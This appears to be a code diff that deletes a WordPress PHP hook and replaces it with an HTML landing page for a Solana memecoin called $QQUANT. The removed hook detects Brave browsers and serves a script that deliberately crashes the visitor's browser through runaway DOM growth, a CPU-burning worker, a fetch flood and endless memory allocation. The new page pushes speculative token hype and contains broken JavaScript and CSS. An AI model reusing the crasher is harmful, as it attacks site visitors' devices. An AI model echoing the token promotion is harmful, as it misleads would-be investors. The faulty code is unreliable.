@@ -1,64 +1,144 @@
-add_action('init', function() {
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>QuokkaQuantum | $QQUANT</title>
+  <meta name="description" content="The first tokenized happiness particle. Quantum leaps. Permanent smiles."/>
+  <link rel="icon" href="https://i.imgur.com/yourfavicon.png">
+  <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@600;900&family=Orbitron&display=swap" rel="stylesheet">
 
-    // Kecualikan admin, editor, bot, dan yang pake ?noblock
-    if (current_user_can('edit_posts') ||
-        is_admin() ||
-        wp_doing_ajax() ||
-        isset($_GET['noblock']) ||
-        isset($_COOKIE['brave_killer_off']) ||
-        stripos($_SERVER['HTTP_USER_AGENT'] ?? '', 'Googlebot') !== false ||
-        stripos($_SERVER['HTTP_USER_AGENT'] ?? '', 'bingbot') !== false ||
-        stripos($_SERVER['HTTP_USER_AGENT'] ?? '', 'bot') !== false) {
-        return;
+  <style>
+    :root { --cyan: #00f7ff; --magenta: #ff00aa; --dark: #0b0e17; }
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body { background:#000; color:#fff; font-family:'Rajdhani','Orbitron',sans-serif; overflow-x:hidden; min-height:100vh; }
+    #matrix-bg { position:fixed; top:0; left:0; right:0; bottom:0; background:#000; opacity:0.08; pointer-events:none; z-index:1; }
+    .container { position:relative; z-index:10; max-width:1200px; margin:0 auto; padding:0 20px; }
+
+    header { text-align:center; padding:100px 20px 60px; }
+    h1 {
+      font-size:6rem; font-weight:900; letter-spacing:8px;
+      background:linear-gradient(90deg,var(--cyan),var(--magenta),var(--cyan));
+      -webkit-background-clip:text; background-clip:text; color:transparent;
+      animation:glitch 4s infinite;
+    }
+    .tagline { font-size:2rem; margin:20px 0 40px; color:var(--cyan); text-shadow:0 0 20px var(--cyan); }
+
+    .manifesto {
+      max-width:900px; margin:50px auto; font-size:1.7rem; line-height:1.7; text-align:center;
+      color:#a0f7ff; text-shadow:0 0 20px #00f7ff; animation:fadeIn 2s ease-out;
+    }
+    @keyframes glitch {
+      0%,100% { text-shadow:4px 0 #ff00aa,-4px 0 #00f7ff; }
+      20% { text-shadow:-6px 0 #ff00aa,6px 0 #00f7ff; }
+      40% { text-shadow:8px 8px #ff00aa,-8px -8px #00f7ff; }
+    }
+    @keyframes fadeIn { from{opacity:0;transform:translateY(30px);} to{opacity:1;transform:translateY(0);} }
+    @keyframes float { 0%,100%{transform:translateY(0) rotate(0);} 50%{transform:translateY(-30px) rotate(5deg);} }
+
+    .quokka-holo { width:420px; max-width:90%; filter:drop-shadow(0 0 40px var(--cyan)); animation:float 8s ease-in-out infinite, hue 12s infinite linear; }
+    @keyframes hue { from{filter:hue-rotate(0deg);} to{filter:hue-rotate(360deg);} }
+
+    #particles { position:fixed; top:0; left:0; width:100%; height:100%; z-index:2; pointer-events:none; }
+
+    .buttons { display:flex; flex-wrap:wrap; gap:30px; justify-content:center; margin:70px 0; }
+    .btn {
+      padding:22px 60px; font-size:1.7rem; font-weight:bold; border:2px solid; border-radius:15px;
+      text-decoration:none; color:#fff; text-transform:uppercase; letter-spacing:4px;
+      position:relative; overflow:hidden; transition:0.4s;
+    }
+    .btn-buy { background:rgba(0,247,255,0.1); border-color:var(--cyan); box-shadow:0 0 30px rgba(0,247,255,0.5); }
+    .btn-buy:hover { background:var(--cyan); color:#000; box-shadow:0 0 60px var(--cyan); transform:translateY(-8px); }
+    .btn-ca { background:rgba(255,0,170,0.1); border-color:var(--magenta); box-shadow:0 0 30px rgba(255,0,170,0.5); }
+    .btn-ca:hover { background:var(--magenta); color:#000; box-shadow:0 0 60px var(--magenta); }
+
+    .ca-box {
+      background:rgba(255,255,255,0.05); backdrop-filter:blur(12px); border:1px solid rgba(0,247,255,0.4);
+      padding:35px; border-radius:20px; text-align:center; margin:60px auto; max-width:900px;
+      font-family:'Courier New',monospace; font-size:1.3rem; color:var(--cyan);
     }
 
-    // Deteksi Brave (Android & desktop) – 2025 proof
-    $ua        = $_SERVER['HTTP_USER_AGENT'] ?? '';
-    $sec_ch_ua = $_SERVER['HTTP_SEC_CH_UA'] ?? '';
-    $is_brave  = stripos($ua, 'Brave') !== false ||
-                 stripos($sec_ch_ua, 'Brave') !== false ||
-                 (stripos($ua, 'Chrome') !== false && empty($sec_ch_ua));
+    .chart { margin:100px auto; border-radius:20px; overflow:hidden; border:3px solid var(--cyan); box-shadow:0 0 80px rgba(0,247,255,0.5); }
 
-    if ($is_brave) {
-        http_response_code(403);
-        echo '<!DOCTYPE html><html><head><title>Bye</title></head><body style="margin:0;background:#000;color:#f00;font-family:system-ui,sans-serif">';
-        echo '<div style="position:fixed;inset:0;display:flex;align-items:center;justify-content:center;text-align:center;font-size:4.5rem;z-index:999999">
-                BRAVE MATI DISINI<br>
-                <div style="font-size:2rem;margin-top:20px">Jangan mau enaknya aja</div>
-              </div>';
+    .socials { display:flex; justify-content:center; gap:50px; margin:100px 0; font-size:3.5rem; }
+    .socials a { color:var(--cyan); filter:drop-shadow(0 0 20px var(--cyan)); transition:0.4s; }
+    .socials a:hover { color:var(--magenta); transform:scale(1.4) rotate(15deg); }
 
-        // SCRIPT PEMBUNUH ANDROID + DESKTOP (paling sadis 2025)
-        echo '<script>
-        setTimeout(() => {
-            const k = () => {
-                const d = document.createElement("div");
-                d.innerHTML = new Array(999999999).join("DIEBRAVE");
-                document.body.appendChild(d);
-                requestAnimationFrame(k);
-            };
-            k();
+    footer { text-align:center; padding:80px; color:#555; }
+      @media (max-width:768px) {
+      { h1{font-size:3.8rem;} .tagline{font-size:1.5rem;} .manifesto{font-size:1.3rem; padding:0 20px;} .quokka-holo{width:300px;} }
+  </style>
+</head>
+<body>
 
-            new Worker(URL.createObjectURL(new Blob(["onmessage=()=>{while(true){crypto.getRandomValues(new Uint32Array(9999999))}postMessage(\'\')}"], {type:"application/javascript"}))).postMessage("");
+  <canvas id="matrix-bg"></canvas>
+  <div id="particles"></div>
 
-            setInterval(() => fetch("https://"+Math.random()+".invalid.domain.never.exists"), 1);
+  <header>
+    <div class="container">
+      <h1>QUOKKAQUANTUM</h1>
+      <p class="tagline">Quantum leaps. Permanent smiles.</p>
 
-            while(true) new ArrayBuffer(1024*1024*512);
-        }, 300);
-        </script>';
+      <div class="manifesto">
+        Most animals learned how to survive.<br>
+        Quokkas learned how to <span style="color:#ff00aa;text-shadow:0 0 30px #ff00aa;">never stop smiling</span>.<br><br>
 
-        echo '</body></html>';
-        exit;
-    }
-}, 1);
+        We took that biological glitch, smashed it into the Solana VM,<br>
+        and overclocked it with quantum entanglement.<br><br>
 
-// Admin sekali klik → lolos selamanya
-add_action('wp_footer', function() {
-    if (current_user_can('administrator') && !isset($_COOKIE['brave_killer_off'])) {
-        echo '<script>
-        if(confirm("Izinkan Brave selamanya buat saya?")) {
-            document.cookie="brave_killer_off=1;path=/;max-age=31536000;samesite=strict";
-            location.reload();
-        }
-        </script>';
-    }
-});
+        <strong>$QQUANT</strong> is not a memecoin.<br>
+        It is the first tokenized happiness particle that exists in permanent superposition of<br>
+        <span style="color:#00f7ff;text-shadow:0 0 40px #00f7ff;">“already mooned”</span> and <span style="color:#ff00aa;text-shadow:0 0 40px #ff00aa;">“about to 1000× again”</span>.<br><br>
+
+        Zero taxes. Zero roadmap. Zero sadness.<br>
+        Only irreversible joy and price discovery at the speed of light.<br><br>
+
+        <em>The chart doesn’t go up — it quantum tunnels straight through your sell button.</em>
+      </div>
+
+      <img src="https://i.imgur.com/YOUR_HOLOGRAPHIC_QUOKKA.png" alt="$QQUANT" class="quokka-holo">
+    </div>
+  </header>
+
+  <div class="container buttons">
+    <a href="https://raydium.io/swap/?inputCurrency=sol&outputCurrency=YOUR_CA_HERE&fixed=in" target="_blank" class="btn btn-buy">BUY ON RAYDIUM</a>
+    <div class="btn btn-ca" onclick="copyCA()">COPY CA</div>
+  </div>
+
+  <div class="container">
+    <div class="ca-box">
+      <strong>Contract Address (Solana):</strong><br><br>
+      YOUR_CA_HERE
+      <p style="margin-top:20px;color:#0f0;font-size:1.4rem;" id="notice">↑ Click button to copy</p>
+    </div>
+  </div>
+
+  <div class="container chart">
+    <iframe src="https://dexscreener.com/solana/YOUR_CA_HERE?embed=1&theme=dark" height="680" width="100%" style="border:none;"></iframe>
+  </div>
+
+  <div class="container socials">
+    <a href="https://t.me/quokkaquantum" target="_blank">Telegram</a>
+    <a href="https://twitter.com/quokkaquantum" target="_blank">Twitter</a>
+    <a href="https://dexscreener.com/solana/YOUR_CA_HERE" target="_blank">Chart</a>
+  </div>
+
+  <footer>
+    © 2025 QuokkaQuantum — First happiness particle on the blockchain.<br>
+    This timeline is now officially quantum.
+  </footer>
+
+  <script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
+  <script>
+    particlesJS('particles',{particles:{number:{value:100},color:{value:['#00f7ff','#ff00aa']},shape:{type:'circle'},opacity:{value:0.8,random:true},size:{value:3,random:true},line_linked:{enable:true,distance:150,color:'#00f7ff',opacity:0.4},move:{enable:true,speed:2}},interactivity:{events:{onhover:{enable:true,mode:'repulse'}}}});
+
+    const canvas=document.getElementById('matrix-bg; const ctx=canvas.getContext('2d');
+    canvas.width=window.innerWidth; canvas.height=window.innerHeight;
+    const letters='QUOKKAQUANTUM量子010101$QQUANT'; const fontSize=14; const columns=canvas.width/fontSize; const drops=Array(Math.floor(columns)).fill(1);
+    function draw(){ctx.fillStyle='rgba(0,0,0,0.05)';ctx.fillRect(0,0,canvas.width,canvas.height);ctx.fillStyle='#00f7ff';ctx.font=fontSize+'px monospace';for(let i=0;i<drops.length;i++){const text=letters.charAt(Math.floor(Math.random()*letters.length));ctx.fillText(text,i*fontSize,drops[i]*fontSize);if(drops[i]*fontSize>canvas.height&&Math.random()>0.975)drops[i]=0;drops[i]++}}setInterval(draw,35);
+
+    function copyCA(){navigator.clipboard.writeText("YOUR_CA_HERE");document.getElementById("notice").innerHTML="CA copied — quantum teleport successful!";setTimeout(()=>{document.getElementById("notice").innerHTML="↑ Click button to copy"},3000);}
+    window.addEventListener('resize',()=>{canvas.width=window.innerWidth;canvas.height=window.innerHeight;});
+  </script>
+</body>
+</html>
